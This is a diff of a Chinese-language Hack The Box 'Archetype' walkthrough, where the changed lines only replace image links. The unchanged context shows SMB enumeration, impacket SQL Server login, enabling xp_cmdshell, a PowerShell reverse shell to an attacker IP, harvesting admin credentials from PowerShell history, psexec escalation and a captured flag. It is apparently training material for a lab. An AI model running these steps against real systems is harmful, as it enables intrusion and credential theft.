@@ -11,18 +11,18 @@ tags:
 ---
 
 ## TASK 1
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125077468-1e24945b-76f7-458f-bfe6-4f804a520c32.png)
+![](/image/hackthebox/Archetype-1.png)
 
 nmap -sV -f 10.129.169.148
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125105804-99afcf45-02f0-43fa-b246-6e88e2af83c2.png)
+![](/image/hackthebox/Archetype-2.png)
 
 ## TASK 2
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125116857-4b52581c-0dd9-432f-93f6-9b15aa7062ab.png)
+![](/image/hackthebox/Archetype-3.png)
 
 根据hint直接subclient一下
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125265382-8fd605dd-2002-46a4-b6a7-55335f206531.png)
+![](/image/hackthebox/Archetype-4.png)
 
 尾缀没有$就是非管理共享目录
 
@@ -51,16 +51,16 @@ smbclient(samba client)可让Linux系统存取Windows系统所分享的资源。
 ```
 
 ## TASK 3
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126217614-f36fbc0d-8b95-4e1f-bc03-9993b98068fc.png)
+![](/image/hackthebox/Archetype-5.png)
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126207064-223f4410-4af8-47d2-8328-8410af89797a.png)
+![](/image/hackthebox/Archetype-6.png)
 
 使用get将文件下载下来
 
 ## TASK 4
 
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126238681-246f0c15-902e-484a-9241-5386d2e15338.png)
+![](/image/hackthebox/Archetype-7.png)
 
 这里考察的我们对impacket框架的了解，在impacket中哪个脚本可以连接SQL Server使用git拉取> 
 
@@ -73,13 +73,13 @@ sudo python3 setup.py install
 pip3 install -r requirements.txt
 >
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126626723-c742664c-5027-4c5b-aaad-2003e569e1bb.png)
+![](/image/hackthebox/Archetype-8.png)
 
 impacket的脚本都在examples里面，看名字知道mssql开头的就是
 
 python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127322891-8b82cac9-0982-44a8-b337-635d5bbce7f6.png)
+![](/image/hackthebox/Archetype-9.png)
 
 **<font style="color:rgb(13, 13, 13);">ARCHETYPE/sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是一个 Windows 认证的用户名，它的格式通常是 </font>**<font style="color:rgb(13, 13, 13);">域/用户名</font>**<font style="color:rgb(13, 13, 13);">。在这种格式中，</font>**<font style="color:rgb(13, 13, 13);">ARCHETYPE</font>**<font style="color:rgb(13, 13, 13);"> 是 Windows 域的名称，而 </font>**<font style="color:rgb(13, 13, 13);">sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是该域中的用户名。</font>
 
@@ -88,17 +88,17 @@ python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth
 ## <font style="color:rgb(13, 13, 13);">TASK 5</font>
 <font style="color:rgb(13, 13, 13);"></font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126750215-79c5a897-3564-4b35-954b-80ec3cde0bd6.png)
+![](/image/hackthebox/Archetype-10.png)
 
 
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126778375-8561fae7-b949-4c40-b442-4c2e10f8ceae.png)
+![](/image/hackthebox/Archetype-11.png)
 
 <font style="color:rgb(0, 0, 0);">成功登录之后可以通过输入以下命令判断当前时候拥有sysadmin权限</font>
 
 <font style="color:rgb(0, 0, 0);">SELECT IS_SRVROLEMEMBER('sysadmin')</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127533101-e94f71ca-8cf3-43c4-a990-c4b5b4af87ba.png)
+![](/image/hackthebox/Archetype-12.png)
 
 <font style="color:rgb(0, 0, 0);">1代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">xp_cmdshell</font><font style="color:rgb(0, 0, 0);">来进行远程代码执行</font>
 
@@ -120,7 +120,7 @@ reconfigure;											\\确认上面的操作
 
 xp_cmdshell "whoami"
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127902676-2fd40e36-2d0c-4ce0-8c17-5f1d4931e204.png)
+![](/image/hackthebox/Archetype-13.png)
 
 <font style="color:rgb(13, 13, 13);">虽然 </font>**<font style="color:rgb(13, 13, 13);">xp_cmdshell</font>**<font style="color:rgb(13, 13, 13);"> 存储过程允许在 SQL Server 中执行一些操作系统级别的命令，但它的功能是受到限制的，并且在安全性上也存在一些风险。因此，有时候需要直接的操作系统shell来进行更多和更复杂的操作。所以我们要反弹shell</font>
 
@@ -138,13 +138,13 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.16.20",443);$stream = $
 
 nc -nvlp 443
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193257304-1d8955f5-157f-4e69-8089-faef5b80c768.png)
+![](/image/hackthebox/Archetype-14.png)
 
 <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">C:\Users\sql_svc\Desktop\user.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">中找到User Own的Flag</font>
 
 3e7b102e78218e935bf3f4951fec21a3
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193479859-515bf8f3-ec72-4bc6-9e9a-32525abde825.png)
+![](/image/hackthebox/Archetype-15.png)
 
 <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件</font>
 
@@ -152,7 +152,7 @@ nc -nvlp 443
 type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193500916-30a4fdb6-8ec6-4bfb-b770-5786ec24f836.png)
+![](/image/hackthebox/Archetype-16.png)
 
 <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现管理员账号及密码</font>
 
@@ -161,7 +161,7 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 <font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);"></font>
 
 ## <font style="color:rgb(13, 13, 13);">TASK 6</font>
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709128109051-216e6e33-da6c-46b6-b359-cc96572ed897.png)
+![](/image/hackthebox/Archetype-17.png)
 
 这里win和Linux都有一个很好的提权脚本叫PEAS
 
@@ -193,7 +193,7 @@ Git下载地址：[https://github.com/carlospolop/PEASS-ng/releases/tag/20220710
 
 EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709199972513-879d0c76-5caf-4ae0-9cb0-3df047300d13.png)
+![](/image/hackthebox/Archetype-18.png)
 
 <font style="color:rgb(68, 68, 68);">成功获得user的flag</font>
 
@@ -218,7 +218,7 @@ EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行
 
 <font style="color:rgb(0, 0, 0);">psexec.py administrator@10.10.10.27</font>
 
-![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193783317-b44d9244-5e48-4e5f-a114-1e52e91f98c4.png)
+![](/image/hackthebox/Archetype-19.png)
 
 <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">执行 </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">type C:\Users\Administrator\Desktop\root.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);"> 命令成功拿到System Own的Flag</font>
 
